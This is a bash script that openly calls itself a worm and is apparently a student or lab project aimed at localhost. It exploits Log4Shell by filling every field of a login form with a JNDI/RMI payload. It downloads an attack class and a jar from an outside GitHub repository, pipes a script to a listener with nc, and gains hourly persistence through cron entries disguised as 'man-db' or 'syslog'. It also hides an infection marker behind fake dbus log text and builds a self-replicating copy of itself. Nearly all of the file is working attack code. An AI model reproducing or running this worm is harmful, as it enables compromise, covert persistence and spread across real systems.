#!/bin/bash

# Check if the machine has already been infected

USER=`whoami`
FILENAME=".dbus-update-errors"
FILESYSTEM_FILE="$HOME/$FILENAME"

MSG="dbus-update-activation-environment: setting DISPLAY=:0 \n
dbus-update-activation-environment: setting XAUTHORITY=/home/$USER/.Xauthority \n
dbus-update-activation-environment: setting QT_ACCESSIBILITY=1 \n
dbus-update-activation-environment: setting SHELL=/bin/bash \n
dbus-update-activation-environment: setting QT_ACCESSIBILITY=1 \n
dbus-update-activation-environment: setting XDG_SESSION_PATH=/org/freedesktop/DisplayManager/Session0 \n
dbus-update-activation-environment: setting PWD=`pwd` \n
dbus-update-activation-environment: setting GDM_LANG=en_US \n
dbus-update-activation-environment: setting HOME=$HOME \n
dbus-update-activation-environment: setting IM_CONFIG_PHASE=1 \n
dbus-update-activation-environment: setting LANG=en_US.UTF-8 \n
dbus-update-activation-environment: setting LC_PAPER=en_US.UTF-8 \n
dbus-update-activation-environment: setting LC_NUMERIC=en_US.UTF-8 \n
dbus-update-activation-environment: setting _=/usr/bin/dbus-update-activation-environment \n"

# File requirements:
# 	REAL_SCRIPT: it's the master script that actually exploits log4shell (aka Master script)
# 	INFECTION: it's literally this script
# 	JAVA_RMI_SERVER: it's the RMI server (.class and .jar files)

REAL_SCRIPT_NAME="Im_legit"
REAL_SCRIPT_LOCATION="$HOME/$REAL_SCRIPT_NAME"
INFECTION_NAME="Im_a_legit_worm"
INFECTION_LOCATION="$HOME/$INFECTION_NAME"
JAVA_RMI_SERVER_LOCATION="$HOME"


CRON_SCRIPT_CONTENT="#!/bin/bash \n
# touch $HOME/Hi_ITS_ME \n
$REAL_SCRIPT_LOCATION localhost:8080 localhost:8080/login $INFECTION_LOCATION > /dev/null 2> &1 \n" # 2> &1 moves stderr to stdout

if [ ! -f "$FILESYSTEM_FILE" ]; then
	echo -e $MSG > $FILESYSTEM_FILE # Use touch to modify the dates?
else
	exit
fi


# We only proceed if it hasn't been infected

if [ $USER == "root" ] && [ -d "/etc/cron.hourly" ]; then # Write in /etc/cron.hourly
	SCRIPT_NAME="man-db" # Careful with name, otherwise it won't be run by cron
	# run-parts --test /etc/cron.hourly to test it
	SCRIPT_PATH="/etc/cron.hourly/$SCRIPT_NAME"
	echo -e $CRON_SCRIPT_CONTENT > $SCRIPT_PATH
	chmod +x $SCRIPT_PATH
else # Create an entry in crontab
	SCRIPT_NAME="syslog"
	SCRIPT_PATH="$HOME/$SCRIPT_NAME"	
	echo -e $CRON_SCRIPT_CONTENT > $SCRIPT_PATH
	chmod +x $SCRIPT_PATH
	# Maybe do some fancy and fun stuff...
	EDITOR="vi"
	(crontab -l | echo -e "0 * * * * $SCRIPT_PATH") | crontab -
fi

MASTER_SCRIPT="#!/bin/bash \nif [ $# -ne 3 ] \nthen \n	echo \"Usage: ./Master_script.sh LOGIN_PAGE TARGET_URL SCRIPT_REMOTE_EXECUTION\" \n	echo \"Eg: ./Master_script.sh localhost:8080 localhost:8080/login test_script_touch.sh\" \n	echo \"Eg: ./Master_script.sh localhost:8080 localhost:8080/login Worm.sh\" \n	exit -1 \nfi \nLOGIN_PAGE=$1 \nTARGET_URL=$2 \nSCRIPT=$3 \nlist=`curl $LOGIN_PAGE | awk '/<input/,/>/' | grep -Po 'name=\"\K[^\"]*'` \nmalicious_user=\"%24%7Bjndi%3Armi%3A%2F%2Flocalhost%3A1097%2FObject%7D\" # ${jndi:rmi://localhost:1097/Object} \nstr_req=\"\" \nfor element in $list \ndo \n	new_field=\"${element}=$malicious_user\" \n	if [ ! -z \"$str_req\" ] \n	then \n		str_req=\"${str_req}&\" \n	fi \n	str_req=\"${str_req}${new_field}\" \ndone \ncd $JAVA_RMI_SERVER_LOCATION ; java -cp tomcat-catalina-8.5.83.jar:. Attack & # as a child shell \nJAVA_PID=$! # Special bash command \nsleep 1 # Wait for the RMI server to be set up, otherwise it fails \ncurl -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d $str_req $TARGET_URL \nnc_exit_code=1 \nwhile [ \"$nc_exit_code\" -ne 0 ]; do \n	sleep 1 \n	cat $SCRIPT | nc -q 0 localhost 6969 \n	nc_exit_code=$? \ndone \nkill -kill $JAVA_PID \n "

echo -e $MASTER_SCRIPT > $REAL_SCRIPT_LOCATION
chmod +x $REAL_SCRIPT_LOCATION

wget -O $JAVA_RMI_SERVER_LOCATION/Attack.class https://github.com/aviba2000/MALWARE_aux_filed/blob/master/Attack.class?raw=true
wget -O $JAVA_RMI_SERVER_LOCATION/tomcat-catalina-8.5.83.jar https://github.com/aviba2000/MALWARE_aux_filed/blob/master/tomcat-catalina-8.5.83.jar?raw=true

INFECTION_SCRIPT_aux="#!/bin/bash \nUSER=`whoami` \nFILENAME=\".dbus-update-errors\" \nFILESYSTEM_FILE=\"$HOME/$FILENAME\" \nMSG=\"dbus-update-activation-environment: setting DISPLAY=:0 \n \ndbus-update-activation-environment: setting XAUTHORITY=/home/$USER/.Xauthority \n \ndbus-update-activation-environment: setting QT_ACCESSIBILITY=1 \n \ndbus-update-activation-environment: setting SHELL=/bin/bash \n \ndbus-update-activation-environment: setting QT_ACCESSIBILITY=1 \n \ndbus-update-activation-environment: setting XDG_SESSION_PATH=/org/freedesktop/DisplayManager/Session0 \n \ndbus-update-activation-environment: setting PWD=`pwd` \n \ndbus-update-activation-environment: setting GDM_LANG=en_US \n \ndbus-update-activation-environment: setting HOME=$HOME \n \ndbus-update-activation-environment: setting IM_CONFIG_PHASE=1 \n \ndbus-update-activation-environment: setting LANG=en_US.UTF-8 \n \ndbus-update-activation-environment: setting LC_PAPER=en_US.UTF-8 \n \ndbus-update-activation-environment: setting LC_NUMERIC=en_US.UTF-8 \n \ndbus-update-activation-environment: setting _=/usr/bin/dbus-update-activation-environment \n\" \nREAL_SCRIPT_NAME=\"Im_legit\" \nREAL_SCRIPT_LOCATION=\"$HOME/$REAL_SCRIPT_NAME\" \nINFECTION_NAME=\"Im_a_legit_worm\" \nINFECTION_LOCATION=\"$HOME/$INFECTION_NAME\" \nJAVA_RMI_SERVER_LOCATION=\"$HOME\" \nCRON_SCRIPT_CONTENT=\"#!/bin/bash \n \n$REAL_SCRIPT_LOCATION localhost:8080 localhost:8080/login $INFECTION_LOCATION > /dev/null 2> &1 \n\" # 2> &1 moves stderr to stdout \nif [ ! -f \"$FILESYSTEM_FILE\" ]; then \n	echo -e $MSG > $FILESYSTEM_FILE # Use touch to modify the dates? \nelse \n	exit \nfi \nif [ $USER == \"root\" ] && [ -d \"/etc/cron.hourly\" ]; then # Write in /etc/cron.hourly \n	SCRIPT_NAME=\"man-db\" # Careful with name, otherwise it won't be run by cron \n	# run-parts --test /etc/cron.hourly to test it \n	SCRIPT_PATH=\"/etc/cron.hourly/$SCRIPT_NAME\" \n	echo -e $CRON_SCRIPT_CONTENT > $SCRIPT_PATH \n	chmod +x $SCRIPT_PATH \nelse # Create an entry in crontab \n	SCRIPT_NAME=\"syslog\" \n	SCRIPT_PATH=\"$HOME/$SCRIPT_NAME\"	 \n	echo -e $CRON_SCRIPT_CONTENT > $SCRIPT_PATH \n	chmod +x $SCRIPT_PATH \n	# Maybe do some fancy and fun stuff... \n	EDITOR=\"vi\" \n	(crontab -l | echo -e \"0 * * * * $SCRIPT_PATH\") | crontab - \nfi \nMASTER_SCRIPT=\"#!/bin/bash \nif [ $# -ne 3 ] \nthen \n	echo \\"Usage: ./Master_script.sh LOGIN_PAGE TARGET_URL SCRIPT_REMOTE_EXECUTION\\" \n	echo \\"Eg: ./Master_script.sh localhost:8080 localhost:8080/login test_script_touch.sh\\" \n	echo \\"Eg: ./Master_script.sh localhost:8080 localhost:8080/login Worm.sh\\" \n	exit -1 \nfi \nLOGIN_PAGE=$1 \nTARGET_URL=$2 \nSCRIPT=$3 \nlist=`curl $LOGIN_PAGE | awk '/<input/,/>/' | grep -Po 'name=\\"\K[^\\"]*'` \nmalicious_user=\\"%24%7Bjndi%3Armi%3A%2F%2Flocalhost%3A1097%2FObject%7D\\" # ${jndi:rmi://localhost:1097/Object} \nstr_req=\\"\\" \nfor element in $list \ndo \n	new_field=\\"${element}=$malicious_user\\" \n	if [ ! -z \\"$str_req\\" ] \n	then \n		str_req=\\"${str_req}&\\" \n	fi \n	str_req=\\"${str_req}${new_field}\\" \ndone \ncd $JAVA_RMI_SERVER_LOCATION ; java -cp tomcat-catalina-8.5.83.jar:. Attack & # as a child shell \nJAVA_PID=$! # Special bash command \nsleep 1 # Wait for the RMI server to be set up, otherwise it fails \ncurl -X POST -H \\"Content-Type: application/x-www-form-urlencoded\\" -d $str_req $TARGET_URL \nnc_exit_code=1 \nwhile [ \\"$nc_exit_code\\" -ne 0 ]; do \n	sleep 1 \n	cat $SCRIPT | nc -q 0 localhost 6969 \n	nc_exit_code=$? \ndone \nkill -kill $JAVA_PID \n \" \necho -e $MASTER_SCRIPT > $REAL_SCRIPT_LOCATION \nchmod +x $REAL_SCRIPT_LOCATION \nwget -O $JAVA_RMI_SERVER_LOCATION/Attack.class https://github.com/aviba2000/MALWARE_aux_filed/blob/master/Attack.class?raw=true \nwget -O $JAVA_RMI_SERVER_LOCATION/tomcat-catalina-8.5.83.jar https://github.com/aviba2000/MALWARE_aux_filed/blob/master/tomcat-catalina-8.5.83.jar?raw=true \nINFECTION_SCRIPT_aux= \n "

INFECTION_SCRIPT=$INFECTION_SCRIPT_aux\"$INFECTION_SCRIPT_aux\" # Untested yet

echo -e $INFECTION_SCRIPT








